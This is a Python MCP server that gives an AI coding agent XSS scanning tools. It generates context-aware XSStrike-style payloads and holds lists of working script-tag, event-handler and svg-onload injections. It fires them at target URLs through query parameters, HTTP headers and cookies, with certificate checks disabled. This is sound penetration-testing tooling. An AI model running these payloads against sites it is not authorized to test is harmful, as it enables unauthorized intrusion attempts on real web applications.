#!/usr/bin/env python3
"""
XSS Scanner MCP Server
暴露 XSS 扫描功能为 MCP tools，供 Claude Code 调用。

工具列表：
  - xss_scan          : 全量 XSS 扫描（反射型 + Header + Cookie + DOM）
  - xss_scan_reflected: 反射型 XSS 扫描
  - xss_scan_headers  : HTTP Header XSS 扫描
  - xss_scan_dom      : DOM XSS 静态分析
  - xss_scan_batch    : 批量 URL 扫描

启动方式（stdio）：
  python xss_mcp_server.py

配置到 .claude.json:
  "xss-scanner": {
    "type": "stdio",
    "command": "python",
    "args": ["C:\\Users\\lin\\.codex\\mcp-packages\\burp-official\\xss_mcp_server.py"]
  }
"""

import json
import re
import random
import sys
from urllib.parse import urlparse, parse_qs, urlencode

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from mcp.server.fastmcp import FastMCP

mcp = FastMCP("xss-scanner", instructions="XSS vulnerability scanner. Provides tools for reflected, header, cookie, and DOM XSS scanning.")

# ============================================================
# XSStrike 风格配置（与 xss_scanner.py 相同）
# ============================================================

XSSCHECKER = 'v3dm0s'

tags = ('html', 'd3v', 'a', 'details')
eFillings = ('%09', '%0a', '%0d', '+')
fillings = ('%09', '%0a', '%0d', '/+/')
lFillings = ('', '%0dx')

eventHandlers = {
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a'],
    'onmouseover': ['a', 'html', 'd3v']
}

functions = (
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'confirm()',
    '(prompt)``', 'a=prompt,a()')

CURATED_PAYLOADS = [
    ('"><script>alert()</script>', 11, 'html'),
    ('" onmouseover=alert(1) "', 11, 'attribute'),
    ("' onfocus=javascript:alert() '", 11, 'attribute'),
    ('" onfocus=javascript:alert() "', 11, 'attribute'),
    ('"><a href=javascript:alert()>a</a>', 11, 'html'),
    ('"><ScRipt>alert()</ScriPt>', 11, 'html'),
    ('"><SVG ONLOAD=alert()>', 11, 'html'),
    ('"><IMG SRC=x ONERROR=alert()>', 11, 'html'),
    ('"><oonnmouseover=alert(1)>', 10, 'attribute'),
    ('"><scscriptript>alert()</scscriptript>', 10, 'html'),
    ('&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;', 11, 'url_param'),
    ('" onfocus=javascript:alert() type="text', 11, 'attribute'),
    ('" onmouseover=alert() type="text', 11, 'attribute'),
]

XSSTRIKE_PAYLOADS = (
    '\'"</Script><Html Onmouseover=(confirm)()//',
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confirm()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((prompt))()//',
    '<iMg sRc=x:confirm`` oNlOad=eval(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<img src=x onerror=confirm`1`>',
    '<svg/onload=confirm`1`>',
)

HEADER_XSS_TARGETS = [
    "Referer", "User-Agent", "X-Forwarded-For", "X-Real-IP",
    "X-Originating-IP", "X-Remote-Addr", "X-Client-IP",
    "Client-IP", "True-Client-IP", "X-Forwarded-Host",
]

DOM_SINKS = [
    'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
    'eval', 'setTimeout', 'setInterval', 'Function',
    'location.href', 'location.hash', 'location.replace', 'location.assign',
    'document.URL', 'window.open', 'document.cookie',
    'insertAdjacentHTML', 'createContextualFragment'
]

DOM_SOURCES = [
    'location.search', 'location.hash', 'location.href',
    'document.referrer', 'window.name',
    'localStorage.getItem', 'sessionStorage.getItem'
]

# ============================================================
# 核心检测逻辑
# ============================================================

def _extract_scripts(html):
    scripts = []
    for match in re.finditer(r'<script[^>]*>([\s\S]*?)</script>', html, re.IGNORECASE):
        scripts.append(match.group(1))
    return scripts

def _escaped(index, string):
    count = 0
    i = index - 1
    while i >= 0 and string[i] == '\\':
        count += 1
        i -= 1
    return count % 2 == 1

def _is_bad_context(position, non_executable_contexts):
    for ctx in non_executable_contexts:
        if ctx[0] <= position <= ctx[1]:
            return ctx[2]
    return ''

def html_parser(response_text):
    xsschecker = XSSCHECKER
    reflections = response_text.count(xsschecker)
    if reflections == 0:
        return {}

    position_and_context = {}
    environment_details = {}
    clean_response = re.sub(r'<!--[\s\S]*?-->', '', response_text)

    for script in _extract_scripts(clean_response):
        occurences = re.finditer(r'(%s.*?)$' % re.escape(xsschecker), script, re.MULTILINE)
        for occurence in occurences:
            this_position = occurence.start(1)
            position_and_context[this_position] = 'script'
            environment_details[this_position] = {'details': {'quote': ''}}
            for i in range(len(occurence.group())):
                current_char = occurence.group()[i]
                if current_char in ('/', '\'', '`', '"') and not _escaped(i, occurence.group()):
                    environment_details[this_position]['details']['quote'] = current_char
                elif current_char in (')', ']', '}') and not _escaped(i, occurence.group()):
                    break
            clean_response = clean_response.replace(xsschecker, '', 1)

    if len(position_and_context) < reflections:
        attribute_context = re.finditer(r'<[^>]*?(%s)[^>]*?>' % re.escape(xsschecker), clean_response)
        for occurence in attribute_context:
            match = occurence.group(0)
            this_position = occurence.start(1)
            parts = re.split(r'\s', match)
            tag = parts[0][1:] if parts else ''
            for part in parts:
                if xsschecker in part:
                    Type = ''
                    quote = ''
                    name = ''
                    value = ''
                    if '=' in part:
                        match_quote = re.search(r"=([\'\"`])?", part)
                        quote = match_quote.group(1) if match_quote and match_quote.group(1) else ''
                        parts_split = part.split('=', 1)
                        name_and_value = (parts_split[0], parts_split[1] if len(parts_split) > 1 else '')
                        Type = 'name' if xsschecker == name_and_value[0] else 'value'
                        name = name_and_value[0]
                        value = name_and_value[1].rstrip('>').rstrip(quote or '').lstrip(quote or '') if name_and_value[1] else ''
                    else:
                        Type = 'flag'
                    position_and_context[this_position] = 'attribute'
                    environment_details[this_position] = {
                        'details': {'tag': tag, 'type': Type, 'quote': quote, 'value': value, 'name': name}
                    }

    if len(position_and_context) < reflections:
        for occurence in re.finditer(re.escape(xsschecker), clean_response):
            this_position = occurence.start()
            if this_position not in position_and_context:
                position_and_context[this_position] = 'html'
                environment_details[this_position] = {'details': {}}

    if len(position_and_context) < reflections:
        for occurence in re.finditer(r'<!--[\s\S]*?(%s)[\s\S]*?-->' % re.escape(xsschecker), response_text):
            this_position = occurence.start(1)
            if this_position not in position_and_context:
                position_and_context[this_position] = 'comment'
                environment_details[this_position] = {'details': {}}

    database = {}
    for i in sorted(position_and_context):
        database[i] = {
            'position': i,
            'context': position_and_context[i],
            'details': environment_details.get(i, {}).get('details', {})
        }

    bad_contexts = re.finditer(
        r'(?s)(?i)<(style|template|textarea|title|noembed|noscript)>[\s\S]*?(%s)[\s\S]*?</\1>' % re.escape(xsschecker),
        response_text
    )
    non_executable_contexts = []
    for each in bad_contexts:
        non_executable_contexts.append([each.start(), each.end(), each.group(1)])
    if non_executable_contexts:
        for key in database.keys():
            position = database[key]['position']
            bad_tag = _is_bad_context(position, non_executable_contexts)
            database[key]['details']['badTag'] = bad_tag if bad_tag else ''

    return database

def _random_upper(string):
    return ''.join(c.upper() if random.random() > 0.5 else c for c in string)

def _gen_gen(fillings_list, e_fillings, l_fillings, event_handlers, tag_list, func_list, ends, bad_tag=''):
    payloads = set()
    for tag in tag_list:
        if tag == bad_tag:
            continue
        for event in event_handlers:
            if tag in event_handlers[event]:
                for e_filling in e_fillings:
                    for l_filling in l_fillings:
                        for filling in fillings_list:
                            for function in func_list:
                                for end in ends:
                                    payload = '<%s%s%s%s=%s%s%s' % (tag, filling, event, e_filling, function, l_filling, end)
                                    payloads.add(payload)
    return list(payloads)

def _generate_payloads(occurences, response_text):
    scripts = _extract_scripts(response_text)
    index = 0
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}

    for i in occurences:
        context = occurences[i]['context']
        if context == 'html':
            bad_tag = occurences[i]['details'].get('badTag', '')
            for p in _gen_gen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ['//', '>'], bad_tag):
                vectors[10].add(p)
        elif context == 'attribute':
            quote = occurences[i]['details'].get('quote', '')
            for p in _gen_gen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ['//', '>']):
                if quote:
                    p = quote + '>' + p
                vectors[9].add(p)
            if quote:
                for f in fillings:
                    for func in functions:
                        vectors[8].add('%s%s%s%s=%s%s' % (quote, f, _random_upper('autofocus'), f, _random_upper('onfocus'), func))
        elif context == 'script':
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue
            for p in _gen_gen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ['//', '>']):
                vectors[10].add(p)
            index += 1

    for payload, priority, ctx in CURATED_PAYLOADS:
        vectors[priority].add(payload)
    for payload in XSSTRIKE_PAYLOADS:
        vectors[10].add(payload)

    all_payloads = []
    for priority in sorted(vectors.keys(), reverse=True):
        for payload in vectors[priority]:
            if priority >= 8:
                all_payloads.append({'payload': payload, 'priority': priority})
    return all_payloads

def _check_reflection(response_body, payload):
    if payload in response_body:
        return True
    lower = payload.lower()
    if 'onmouseover' in lower or 'onfocus' in lower or 'ontoggle' in lower:
        event_part = payload.split('=')[0] if '=' in payload else payload
        if event_part.lower() in response_body.lower():
            return True
    if '<script' in lower and '<script' in response_body.lower():
        return True
    return False

def _safe_request(url, method="GET", headers=None, data=None, timeout=10):
    try:
        if method.upper() == "GET":
            return requests.get(url, headers=headers, data=data, timeout=timeout, verify=False, allow_redirects=False)
        else:
            return requests.post(url, headers=headers, data=data, timeout=timeout, verify=False, allow_redirects=False)
    except:
        return None

# ============================================================
# MCP Tools
# ============================================================

@mcp.tool()
def xss_scan(url: str, deep: bool = False, timeout: int = 10) -> str:
    """
    Full XSS vulnerability scan. Tests reflected XSS in URL parameters, HTTP headers, cookies, and optionally DOM-based XSS.

    Args:
        url: Target URL with query parameters (e.g. http://target.com/search?q=test)
        deep: If true, includes DOM XSS static analysis (slower)
        timeout: HTTP request timeout in seconds
    """
    results = {
        "target": url,
        "reflected": _scan_reflected(url, timeout),
        "headers": _scan_headers(url, timeout),
        "cookie": _scan_cookie(url, timeout),
    }
    if deep:
        results["dom"] = _scan_dom(url, timeout)

    total = sum(len(v) for v in results.values() if isinstance(v, list))
    results["total_vulnerabilities"] = total
    return json.dumps(results, indent=2, ensure_ascii=False)

@mcp.tool()
def xss_scan_reflected(url: str, timeout: int = 10) -> str:
    """
    Scan for reflected XSS in URL parameters. Injects XSStrike-style checker, analyzes reflection context (html/attribute/script), generates context-aware payloads.

    Args:
        url: Target URL with query parameters (e.g. http://target.com/search?q=test&name=foo)
        timeout: HTTP request timeout in seconds
    """
    findings = _scan_reflected(url, timeout)
    return json.dumps({"target": url, "vulnerabilities": findings, "total": len(findings)}, indent=2, ensure_ascii=False)

@mcp.tool()
def xss_scan_headers(url: str, timeout: int = 10) -> str:
    """
    Scan HTTP headers for XSS injection. Tests Referer, User-Agent, X-Forwarded-For, X-Real-IP and other headers.

    Args:
        url: Target URL
        timeout: HTTP request timeout in seconds
    """
    findings = _scan_headers(url, timeout)
    return json.dumps({"target": url, "vulnerabilities": findings, "total": len(findings)}, indent=2, ensure_ascii=False)

@mcp.tool()
def xss_scan_dom(url: str, timeout: int = 10) -> str:
    """
    Static analysis for DOM-based XSS. Detects dangerous JS sinks (innerHTML, eval, document.write) combined with user-controlled sources (location.hash, location.search, document.referrer).

    Args:
        url: Target URL
        timeout: HTTP request timeout in seconds
    """
    findings = _scan_dom(url, timeout)
    return json.dumps({"target": url, "findings": findings}, indent=2, ensure_ascii=False)

@mcp.tool()
def xss_scan_batch(urls: list[str], deep: bool = False, timeout: int = 10) -> str:
    """
    Batch XSS scan on multiple URLs.

    Args:
        urls: List of target URLs
        deep: If true, includes DOM XSS analysis
        timeout: HTTP request timeout in seconds
    """
    all_results = []
    for url in urls:
        result = {"target": url, "reflected": _scan_reflected(url, timeout), "headers": _scan_headers(url, timeout), "cookie": _scan_cookie(url, timeout)}
        if deep:
            result["dom"] = _scan_dom(url, timeout)
        result["total"] = sum(len(v) for v in result.values() if isinstance(v, list))
        all_results.append(result)

    total_vulns = sum(r.get("total", 0) for r in all_results)
    return json.dumps({"scanned": len(urls), "total_vulnerabilities": total_vulns, "results": all_results}, indent=2, ensure_ascii=False)

# ============================================================
# 扫描实现
# ============================================================

def _scan_reflected(target_url, timeout=10):
    parsed = urlparse(target_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return []

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    findings = []

    for param_name in params:
        # 注入 checker
        test_params = dict(params)
        test_params[param_name] = [XSSCHECKER]
        test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()

        resp = _safe_request(test_url, headers=base_headers, timeout=timeout)
        if not resp:
            continue

        occurences = html_parser(resp.text)
        if not occurences:
            continue

        payloads = _generate_payloads(occurences, resp.text)[:10]

        for p in payloads:
            payload_str = p['payload']
            test_params[param_name] = [payload_str]
            test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()

            payload_resp = _safe_request(test_url, headers=base_headers, timeout=timeout)
            if not payload_resp:
                continue

            if _check_reflection(payload_resp.text, payload_str):
                findings.append({
                    "type": "reflected_xss",
                    "parameter": param_name,
                    "payload": payload_str,
                    "priority": p['priority'],
                    "severity": "high" if p['priority'] >= 10 else "medium",
                    "url": test_url,
                    "status_code": payload_resp.status_code,
                })
                break

    return findings

def _scan_headers(target_url, timeout=10):
    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    xss_payload = '<script>alert(1)</script>'
    findings = []

    for header_name in HEADER_XSS_TARGETS:
        headers = dict(base_headers)
        headers[header_name] = xss_payload
        resp = _safe_request(target_url, headers=headers, timeout=timeout)
        if not resp:
            continue
        if xss_payload in resp.text:
            findings.append({
                "type": "header_xss",
                "header": header_name,
                "payload": xss_payload,
                "severity": "high",
                "status_code": resp.status_code,
            })

    return findings

def _scan_cookie(target_url, timeout=10):
    xss_payload = '<script>alert(1)</script>'
    cookie_name = 't_sort'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": '%s=%s' % (cookie_name, xss_payload),
    }
    resp = _safe_request(target_url, headers=headers, timeout=timeout)
    if resp and cookie_name in resp.text:
        return [{"type": "cookie_xss", "cookie": cookie_name, "payload": xss_payload, "severity": "high"}]
    return []

def _scan_dom(target_url, timeout=10):
    resp = _safe_request(target_url, timeout=timeout)
    if not resp:
        return []

    scripts = _extract_scripts(resp.text)
    if not scripts:
        return []

    found_sinks = []
    found_sources = []
    for script in scripts:
        for sink in DOM_SINKS:
            if sink in script:
                found_sinks.append(sink)
        for source in DOM_SOURCES:
            if source in script:
                found_sources.append(source)

    unique_sinks = list(set(found_sinks))
    unique_sources = list(set(found_sources))

    if unique_sinks and unique_sources:
        return [{
            "type": "dom_xss_potential",
            "sinks": unique_sinks,
            "sources": unique_sources,
            "severity": "info",
        }]
    return []


if __name__ == "__main__":
    mcp.run(transport="stdio")
